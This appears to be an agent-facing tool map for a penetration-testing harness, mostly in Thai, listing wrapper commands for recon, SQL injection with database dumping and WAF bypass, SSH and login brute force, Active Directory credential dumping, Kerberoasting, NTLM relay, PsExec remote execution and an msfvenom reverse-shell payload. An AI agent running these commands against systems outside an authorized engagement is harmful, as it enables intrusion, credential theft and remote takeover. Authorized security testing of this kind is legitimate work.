# SB Arsenal — Tool Map
# Maps intent → exact command to run
# Agent reads this to know WHAT to use and HOW

Run examples from the current Harness checkout. The runtime snapshot identifies the host; the dispatcher selects Windows WSL or Linux `kali-shell` directly. The catalog does not imply that every binary is installed.

# ═══════════════════════════════════════════════════════════════
# TOOL MAP — intent → command (Windows WSL or Linux Kali Docker)
# ═══════════════════════════════════════════════════════════════

## RECON

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| สแกนพอร์ต | `node scripts/sb-arsenal.cjs nmap_scan --target <IP> --ports 22,80,443` |
| สแกนละเอียด (NSE scripts) | `node scripts/sb-arsenal.cjs nmap_advanced_scan --target <IP>` |
| หา subdomain | `node scripts/sb-arsenal.cjs subfinder_enum --domain <domain>` |
| หา subdomain ลึก | `node scripts/sb-arsenal.cjs amass_enum --domain <domain>` |
| จับ tech stack | `node scripts/sb-arsenal.cjs httpx_probe --target <URL>` |
| DNS lookup | `node scripts/sb-arsenal.cjs dig_lookup --domain <domain> --type A` |
| WHOIS | `node scripts/sb-arsenal.cjs whois_lookup --domain <domain>` |
| OSINT emails/names | `node scripts/sb-arsenal.cjs theharvester_osint --domain <domain>` |

## WEB SCANNING

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| หาช่องโหว่ (CVE) | `node scripts/sb-arsenal.cjs nuclei_scan --target <URL> --severity critical,high` |
| หา directory/file ซ่อน | `node scripts/sb-arsenal.cjs ffuf_dir --url <URL>` |
| Directory brute (alt) | `node scripts/sb-arsenal.cjs gobuster_dir --url <URL>` |
| Web vuln scan | `node scripts/sb-arsenal.cjs nikto_scan --target <URL>` |
| WordPress scan | `node scripts/sb-arsenal.cjs wpscan_scan --url <URL>` |

## SQL INJECTION

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| ทดสอบ SQLi | `node scripts/sb-arsenal.cjs sqlmap_scan --url "<URL>?param=1"` |
| SQLi + dump DB | `node scripts/sb-arsenal.cjs sqlmap_scan --url "<URL>" --dbs --dump` |
| SQLi + WAF bypass | `node scripts/sb-arsenal.cjs sqlmap_tamper --url "<URL>"` |

## BRUTE FORCE

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| Brute SSH | `node scripts/sb-arsenal.cjs hydra_brute --target <IP> --service ssh --user admin --passlist /usr/share/wordlists/rockyou.txt` |
| Brute HTTP login | `node scripts/sb-arsenal.cjs hydra_http_form --target <URL> --form_path /login` |
| Crack hash (John) | `node scripts/sb-arsenal.cjs john_crack --hashfile <file>` |
| Crack hash (GPU) | `node scripts/sb-arsenal.cjs hashcat_crack --hashfile <file> --mode 0` |

## ACTIVE DIRECTORY

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| Enum SMB | `node scripts/sb-arsenal.cjs enum4linux_scan --target <IP>` |
| List SMB shares | `node scripts/sb-arsenal.cjs smbclient_enum --target <IP>` |
| Dump creds | `node scripts/sb-arsenal.cjs secretsdump --target <DC> --user <user> --pass <pass> --domain <domain>` |
| Kerberoast | `node scripts/sb-arsenal.cjs GetUserSPNs --target <DC> --user <user> --pass <pass> --domain <domain>` |
| Remote exec (PsExec) | `node scripts/sb-arsenal.cjs psexec_exec --target <IP> --user <user> --pass <pass> --command whoami` |
| Remote exec (WMI) | `node scripts/sb-arsenal.cjs wmiexec_exec --target <IP> --user <user> --pass <pass> --command whoami` |
| NTLM relay | `node scripts/sb-arsenal.cjs ntlmrelayx --target <IP>` |
| BloodHound collect | `node scripts/sb-arsenal.cjs bloodhound_collect --target <DC> --user <user> --pass <pass> --domain <domain>` |

## EXPLOITATION

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| ค้นหา exploit | `node scripts/sb-arsenal.cjs searchsploit_search --query "<service> <version>"` |
| สร้าง payload | `node scripts/sb-arsenal.cjs msfvenom_payload --payload windows/x64/meterpreter/reverse_tcp --lhost <IP> --lport 4444` |

## FORENSICS

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| แยกไฟล์จาก firmware | `node scripts/sb-arsenal.cjs binwalk_extract --file <path>` |
| วิเคราะห์ memory dump | `node scripts/sb-arsenal.cjs volatility_analyze --file <path>` |
| ดู metadata | `node scripts/sb-arsenal.cjs exiftool_metadata --file <path>` |
| ถอด stego | `node scripts/sb-arsenal.cjs steghide_extract --file <path>` |

## SSL/TLS

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| SSL scan | `node scripts/sb-arsenal.cjs sslscan_target --target <host>` |
| TLS full test | `node scripts/sb-arsenal.cjs testssl_target --target <host>` |

## NETWORK

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| HTTP request | `node scripts/sb-arsenal.cjs curl_fetch --url <URL>` |
| Nmap ผ่าน proxy | `node scripts/sb-arsenal.cjs proxychains_nmap --target <IP> --ports 22,80,445` |

## MCP TOOLS (ใช้ผ่าน harness โดยตรง — ไม่ต้องผ่าน Kali)

| Tool | ใช้ทำอะไร | เรียกยังไง |
|------|-----------|------------|
| `recon_scan` | Full Deep recon | เรียก tool ตรงจาก harness |
| `mcp__rea__*` (170+) | Binary RE, process, browser, firmware, ADB | เรียก tool ตรงจาก harness |
| `mcp__x64dbg__*` (40+) | Debug, memory read/write, patch | เรียก tool ตรงจาก harness |
| `mcp__dnspy__*` (30+) | .NET decompile, patch, rename | เรียก tool ตรงจาก harness |
| `mcp__jev__*` (10) | AI verify, extract, classify | เรียก tool ตรงจาก harness |

## SB PROXY (LLM pipeline)

| คำสั่ง | ทำอะไร |
|--------|--------|
| `pnpm sb:start` | เปิด proxy v6 (recon + skills + wiki + exec) |
| `pnpm sb:stop` | ปิด proxy |
| `pnpm sb:status` | เช็คสถานะ |

## SKILLS (โหลดความรู้ตาม intent)

```
.dsh/skills/ — 135 skills
โหลดอัตโนมัติโดย SB Proxy v6 เมื่อ intent match
หรือเรียกผ่าน skill tool: skill("sqli-sql-injection")
```

## WIKI (reference intel)

```
.dsh/cyber-wiki/ — 70 notes
โหลดอัตโนมัติโดย SB Proxy v6 เมื่อ intent match
```
